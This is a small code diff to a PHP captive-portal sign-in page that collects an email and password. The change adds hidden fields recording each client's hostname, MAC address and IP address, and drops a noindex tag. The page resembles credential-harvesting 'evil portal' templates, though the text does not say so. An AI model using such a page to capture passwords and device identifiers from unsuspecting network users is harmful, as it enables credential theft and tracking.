@@ -15,7 +15,6 @@ require_once('helper.php');
     <meta http-equiv="pragma" content="no-cache" />
     <meta name="viewport" content="width=device-width,
     initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
 
     <script src="jquery-2.2.1.min.js"></script>
     <script type="text/javascript">
@@ -137,6 +136,9 @@ require_once('helper.php');
           <form method="POST" action="/captiveportal/index.php" class="form-signin" onsubmit="redirect()">
             <input type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
             <input type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
             <input type="hidden" name="target" value="<?=$destination?>">
             <button class="btn btn-primary btn-block btn-sharp" name="login" type="submit">Sign in</button>
             <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
